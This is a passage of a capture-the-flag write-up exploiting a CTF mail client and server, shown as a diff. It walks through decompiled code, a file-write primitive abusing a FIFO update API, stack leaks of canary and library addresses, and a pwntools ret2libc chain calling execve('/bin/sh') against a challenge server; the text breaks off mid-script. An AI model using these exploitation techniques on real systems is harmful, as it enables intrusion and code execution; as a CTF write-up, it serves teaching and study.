+<p>Note that the regex for the part of the email before the @ is <code class="language-plaintext highlighter-rouge">[a-zA-Z0-9.]</code>. This will be crucial later.</p>
+
+<p>The subject is read in as a 256-byte string(maximum) of characters in the set <code class="language-plaintext highlighter-rouge">[a-zA-Z0-9.@#$^&amp;*() \/&lt;&gt;?]</code>, which is pretty unrestrictive, and even allows slashes. Pipes are not allowed. There is a check for this on the server side as well.</p>
+
+<p>It then calls a function I named <code class="language-plaintext highlighter-rouge">make_tempfile</code>, source below.
+<img src="https://i.imgur.com/HZnDnCX.png" alt="source code" /></p>
+
+<p>Binary ninja isn’t great at undoing optimisations but basically that code reads 16 random bytes from urandom, doing a modulus of each one and using that to pick a letter. The result is a 16-byte random string of capital and lowercase letter that is far from guessable.</p>
+
+<p>At /tmp/mail/content/XXXXXXXXXXXXXXXX, the mail’s content is written(remember <code class="language-plaintext highlighter-rouge">content_path</code> in the mail server?). It is prefixed with a 4-character decimal string describing the size, e.g “0300”. The maximum size is enforced to be 0x800.</p>
+
+<h4 id="receiving-mail">Receiving mail</h4>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="kt">char</span><span class="o">*</span> <span class="n">rax_26</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_c28</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">rax_26</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+                    <span class="p">{</span>
+                        <span class="n">puts</span><span class="p">(</span><span class="s">"Mail syntax error!"</span><span class="p">);</span>
+                        <span class="n">close</span><span class="p">(</span><span class="n">rax_3</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">else</span>
+                    <span class="p">{</span>
+                        <span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span><span class="o">*</span><span class="p">)</span><span class="n">rax_26</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                        <span class="n">printf</span><span class="p">(</span><span class="s">"Subject: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_c28</span><span class="p">.</span><span class="n">data</span><span class="p">);</span>
+                        <span class="kt">int32_t</span> <span class="n">rax_33</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rax_26</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="n">rax_33</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+                        <span class="p">{</span>
+                            <span class="n">puts</span><span class="p">(</span><span class="s">"Content not found!"</span><span class="p">);</span>
+                            <span class="n">close</span><span class="p">(</span><span class="n">rax_3</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="k">else</span>
+                        <span class="p">{</span>
+                            <span class="kt">void</span> <span class="n">var_820</span><span class="p">;</span>
+                            <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_820</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">rax_33</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_820</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
+                            <span class="p">{</span>
+                                <span class="kt">int32_t</span> <span class="n">rax_44</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_820</span><span class="p">);</span>
+                                <span class="kt">void</span> <span class="n">var_818</span><span class="p">;</span>
+                                <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">var_818</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
+                                <span class="n">read</span><span class="p">(</span><span class="n">rax_33</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_818</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">rax_44</span><span class="p">));</span>
+                                <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var_818</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">rax_44</span><span class="p">));</span>
+                                <span class="n">close</span><span class="p">(</span><span class="n">rax_33</span><span class="p">);</span>
+                                <span class="k">goto</span> <span class="n">label_2211</span><span class="p">;</span>
+                            <span class="p">}</span>
+                            <span class="n">puts</span><span class="p">(</span><span class="s">"Content not found!"</span><span class="p">);</span>
+                            <span class="n">close</span><span class="p">(</span><span class="n">rax_33</span><span class="p">);</span>
+                            <span class="n">close</span><span class="p">(</span><span class="n">rax_3</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Here is where it gets interesting. It queries the mail server for the mail file contents, which are stoed in /home/mailserver/data/USERNAME. It outputs the subject, and then opens the content file. It first reads the first 4 bytes and runs <code class="language-plaintext highlighter-rouge">atoi</code> to convert it to an integer, and reads that many bytes into a buffer on the stack. This buffer is then written to stdout. <strong>The size of the mail data isn’t checked, which is where the vulnerability lies</strong>. It’s not immediately clear how we can even use that when the stack buffer is 0x800 in size anyway and when <em>sending</em> mail, the size is capped at 0x800. That’s where something else comes in.</p>
+
+<h2 id="interfacing-with-the-fifo">Interfacing with the FIFO</h2>
+<p>We get two vulnerabilities here, one in the mail client and one in the mail server.</p>
+
+<p>In the mail client - <strong>the size of the mail data is not checked before it is read into a stack buffer</strong></p>
+
+<p>In the mail server - <strong>when sending email, it is not checked that the email is valid, nor that it actually exists</strong></p>
+
+<p>Mail is sent to /home/mailserver/data/USERNAME. At first, I considered trying to execute a directory traversal attack by sending email to, for example, ../../pwned@hackemall.live, however the mailclient bans slashes in the email. However, <strong>it permits full stops(or periods)</strong></p>
+
+<p>That means that sending emails to update.event@hackemall.live will allow us to write data to /home/mailserver/data/update.event, interacting with the fifo’s API. This is very powerful - a combination of SET and NEW gives arbitrary file write as the mailserver user.</p>
+
+<p>I built some simple functions for interacting with the mailclient.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./mailclient"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./lib/libc.so.6"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">e</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">email</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">content_size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">content_size</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">content_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">@hackemall.live"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">subject</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">content_size</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+    <span class="n">subject</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"*"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">subject</span><span class="p">,</span> <span class="n">data</span>
+ 
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"139.162.36.205"</span> <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span> <span class="k">else</span> <span class="s">"localhost"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+
+<span class="c1"># We just need to interact with the mailclient's update.event file and that gives us arbitrary file write.
+# From there, we can forge custom emails and achieve buffer overflows.
+</span>
+<span class="c1"># Sending an email to update.event@hackemall.live will do it.
+</span>
+<span class="n">email</span> <span class="o">=</span> <span class="s">"day@hackemall.live"</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">"t"</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="n">email</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"@"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="n">login</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I registered an email at day@hackemall.live with password <code class="language-plaintext highlighter-rouge">t</code> manually.</p>
+
+<p>The mail file format is simply <code class="language-plaintext highlighter-rouge">subject|content_path</code>, so we can put the entire thing that we want to send to the FIFO in the subject. The below function builds a simple packet.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">build_packet</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span><span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="c1"># Builds an update.event packet(for ones that aren't UPD)
+</span>    <span class="k">return</span> <span class="n">cmd</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">3</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">data</span>
+</code></pre></div></div>
+<p>Finally, all that is necessary to send a command to update.event is sending an email to update.event@hackemall.live with the subject being what we want, for example NEW005PWNED. The content doesn’t matter(yet), make it whatever you want!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">build_packet</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span><span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="c1"># Builds an update.event packet(for ones that aren't UPD)
+</span>    <span class="k">return</span> <span class="n">cmd</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">3</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">data</span>
+
+<span class="k">def</span> <span class="nf">send_event</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">content</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="s">"I swear on my life, I always try, but in my eye, I can fly. Better luck next time.</span><span class="se">\n</span><span class="s">"</span>
+    <span class="n">send</span><span class="p">(</span><span class="s">"update.event"</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+<p>sure enough, <code class="language-plaintext highlighter-rouge">send_event(build_packet(b"NEW", b"PWNED\n"))</code> works(I tested using a docker image)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@29b3c6292ea3:/home/mailserver/data# cat update.bin
+PWNED 
+</code></pre></div></div>
+
+<h2 id="getting-leaks">Getting leaks</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
+└─$ pwn checksec mailclient  
+[*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div></div>
+<p>Canary and PIE, yep we’ll definitely need good leaks. But how?</p>
+
+<p>Return to the reading email code - it basically does</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">SIZE</span><span class="p">);</span>
+</code></pre></div></div>
+<p>If size is arbitrarily big, then it’ll dump loads of stack data and leaks can almost certainly be leveraged from that. Unfortunately, that might trigger the BOF early, right?</p>
+
+<p>No, not if there just isn’t much data there. If there’s only one byte left in the file and you ask to read 1000, the read will just only read one byte. The mail client will then dump 1000 bytes.</p>
+
+<p>All that’s left is to somehow control the mail content. This isn’t too hard though.</p>
+<ul>
+  <li>SET file path to /tmp/evil</li>
+  <li>use NEW to write custom mail content to /tmp/evil</li>
+  <li>SET file path to /home/mailserver/data/day</li>
+  <li>use NEW to write subject|/tmp/evil</li>
+  <li>Now we have mail with custom data!
+Wait… no. We can’t use new to write a pipe character, because all of the fifo API data is being sent through the subject. And the subject, remember, can’t include pipes.</li>
+</ul>
+
+<p>Well, now what? We can’t instead simply edit the existing content path because the filename is unpredictable.</p>
+
+<p>Recall that we aren’t writing just the subject to update.event. We’re writing subject + “|” + content_path. We’ve been ignoring that but, it’ll now become important.</p>
+
+<p>What if our subject was NEW001, for example? The API would receive <code class="language-plaintext highlighter-rouge">NEW001|/tmp/...</code>, the only relevant parts being <code class="language-plaintext highlighter-rouge">NEW001|</code>. It would then write a pipe buffer to the file.</p>
+
+<p>Let’s instead have the subject be NEW006PWNED. The API would receive <code class="language-plaintext highlighter-rouge">NEW006PWNED|</code>(since “PWNED” is 5 bytes, it would read the next byte as well, the pipe buffer). This let’s us write a pipe buffer after the data we want! Afterwards, we simply use ATE to append the rest.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">custom_mail</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="c1"># Build a custom email
+</span>    <span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"SET"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/tmp/evil"</span><span class="p">))</span>
+    <span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"NEW"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">data</span><span class="p">))</span>
+    <span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"SET"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"/home/mailserver/data/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()))</span>
+    <span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"NEW"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"pwned"</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="s">"pwned"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="c1"># smuggle the pipe in since it will be after the subject and we cant put it in the subject manually
+</span>    <span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"ATE"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/tmp/evil"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Sure enough, setting a size as high as 0x1000, we get lots and lots of leaks. After the buffer will be the canary, then the saved rbp, then the return address(giving binary base leak) and eventually <code class="language-plaintext highlighter-rouge">__libc_start_main_ret</code>. From there, it’s trivial to extract the necessary information!</p>
+
+<p>NOTE: The code in comments was what I used to enumerate the stack data. Sometimes the leaks fail for reasons I don’t know, likely a null byte randomly occuring somewhere. We can restart easily.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">custom_mail</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x10000</span><span class="p">)</span> <span class="c1"># Very high size despite not putting much in the file. This makes it over print, so we can get leaks before exploiting the BOF.
+</span>
+<span class="n">_</span><span class="p">,</span> <span class="n">leaks</span> <span class="o">=</span> <span class="n">read</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">leaks</span> <span class="o">==</span> <span class="sa">b</span><span class="s">''</span><span class="p">:</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">"Leaks failed."</span><span class="p">)</span>
+    <span class="n">quit</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaks suceeded"</span><span class="p">)</span>
+
+<span class="n">old_buf</span> <span class="o">=</span> <span class="n">leaks</span>
+<span class="n">leaks</span> <span class="o">=</span> <span class="n">leaks</span><span class="p">[</span><span class="mh">0x808</span><span class="p">:]</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaks</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="s">"""
+for i in range(8, len(leaks), 8):
+    num = u64(leaks[i:i+8].ljust(8, b"</span><span class="se">\x00</span><span class="s">"))
+    if num == 0:
+        continue
+    print(hex(num), i)
+"""</span>
+
+<span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">16</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x2335</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">64</span><span class="p">:</span><span class="mi">64</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x29d90</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Binary base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Sure enough, checking with <code class="language-plaintext highlighter-rouge">gdb -p $(pidof mailclient)</code>, these leaks are correct!</p>
+
+<h2 id="exploiting-the-bof-preparing-the-payload">Exploiting the BOF: Preparing the payload</h2>
+
+<p>We should be able to use the same principle to overwrite a large amount of data on the stack, achieving a buffer overflow and executing a simple ret2libc ROP chain to pop a shell. But, yet again, we will be screwed over by the restrictions on the subject field.</p>
+
+<p>The subject field can only contain some specific bytes, most certainly not including null bytes and all the random characters that will be present in a ROP chain.</p>
+
+<p>The same trick we used before won’t work here. Although the content itself has no restrictions, the content itself is also stored in an unpredictable, and therefore unknowable, file path. I tried getting it to read the payload from /proc/self/fd/0 but that doesn’t work since it’s actually over a socket.</p>
+
+<p>Wait, hold up, is it really that unknowable?</p>
+
+<p>Recall again that the FIFO api also receives the content path at the end of the packet we send to it. That content can have literally anything we want in it, since it’s unimportant. I previously put lyrics from 4 Morant(good song btw) in there but it could also contain anything, including a ROP payload.</p>
+
+<p>But how can we begin to leak it? Let’s start again from smuggling the data into the packet.</p>
+
+<p>Say I sent <code class="language-plaintext highlighter-rouge">NEW035|/tmp/...</code>(the length of /tmp/mail/content/ is 18, add 16 to that and you get 34, add 1 for the pipe to that and you get 35) This would write <code class="language-plaintext highlighter-rouge">|/tmp/...</code> to whatever file that was currently selected, but is that <em>actually</em> all that useful? How can we even read file data? It’s not like we can select a content path file. How about a mail file?</p>
+
+<p>Writing data to a mail file is a shout, since the subject is printed raw, and so data can be exfiltrated that way. However, if it begins with <code class="language-plaintext highlighter-rouge">|</code>, that won’t be the subject, it’ll be the content path, and setting that is useless.</p>
+
+<p>This is where sscanf inner mechanics come in. The FIFO API reads the number by first grabbing 3 bytes and then passing them to <code class="language-plaintext highlighter-rouge">sscanf(bytes,"%d",&amp;num)</code>. sscanf will stop when it hits an invalid character(in this case a character that isn’t numeric or a plus or minus sign) but it will then <strong>just write the number it already had</strong>. So instead, imagine the FIFO API received the packet <code class="language-plaintext highlighter-rouge">NEW34|/tmp/...</code>. It would first read the command, <code class="language-plaintext highlighter-rouge">NEW</code>. It would then read the number <code class="language-plaintext highlighter-rouge">34|</code> and sscanf it, the result being <code class="language-plaintext highlighter-rouge">34</code> as the length. It would then read everything else as its data, successfully discarding the pipe!</p>
+
+<p>So, sending <code class="language-plaintext highlighter-rouge">NEW34</code> as the subject of an email to update.event@hackemall.live will leak the file path of the contents into whatever file is currently selected. A little manipulation and we can get this to leak the file path through our email file.</p>
+
+<p>I used execve as opposed to system because execve(“/bin/sh”,NULL,NULL) does the job just as well and when you use system there is often needless shenanigans with stack alignment and saved RBP being invalid. e.address + 0x4000 just serves as a dummy RBP value.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4000</span><span class="p">,</span> <span class="n">rop</span><span class="p">.</span><span class="n">chain</span><span class="p">())</span>
+
+<span class="c1"># Ok, now we need to construct the payload in a file. Not easy.
+# We set the update file to /home/mailserver/data/day and then use NEW and some tomfoolery to dump the file path of some content file that contains the main par tof the payload into my mail
+# Then, we can cleanly leak the file path(we dump it as the subject) and use existing primitives to build up the file until its suitable
+# And use our regular old primitives to get it to read in the payload
+</span>
+<span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"SET"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"/home/mailserver/data/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()))</span>
+<span class="n">send_event</span><span class="p">(</span><span class="sa">b</span><span class="s">"NEW"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"34"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># Basically the data written will be NEW34|/tmp/mail/content/FILENAME . 34| will be sscanf'd to get the length as 34 and then the data will be read in as the rest
+</span><span class="n">send_event</span><span class="p">(</span><span class="sa">b</span><span class="s">"ATE"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"001"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I use the trick we used previously in the Getting Leaks chapter to add a pipe in my mailfile so that it becomes valid. The mailfile now reads <code class="language-plaintext highlighter-rouge">FILENAMEBEINGLEAKED|</code> So the content is empty. This’ll give an error, but not a game-breaking one, and the subject will be printed anyway.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">filname</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">read</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"Leaked filename: </span><span class="si">{</span><span class="n">filname</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+<h2 id="exploiting-the-bof-getting-the-payload-onto-the-stack">Exploiting the BOF: Getting the payload onto the stack</h2>
+<p>There is now a file that we know the filepath of containing 4 bytes of data and then the ROP payload. This file needs to become a file containing 4 bytes of data corresponding to the length of the rest, some padding, and then the ROP payload. Everything that needs to be added is alphanumeric, so old methods will do. ATF finally becomes useful here - we want to add data to the front of the file, not after it.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Now ATF is actually useful. We have 4 bytes + payload. We want evil size + 0x804 filler bytes + 4 bytes + payload
+# Unfortunately we cannot write that many bytes in the subject at a time. No worry, it's only a few iterations.
+</span>
+<span class="n">send_event</span><span class="p">(</span><span class="n">build_packet</span><span class="p">(</span><span class="sa">b</span><span class="s">"SET"</span><span class="p">,</span> <span class="n">filname</span><span class="p">))</span>
+<span class="n">to_add</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x808</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x804</span>
+
+<span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">to_add</span><span class="p">),</span> <span class="mi">200</span><span class="p">):</span>
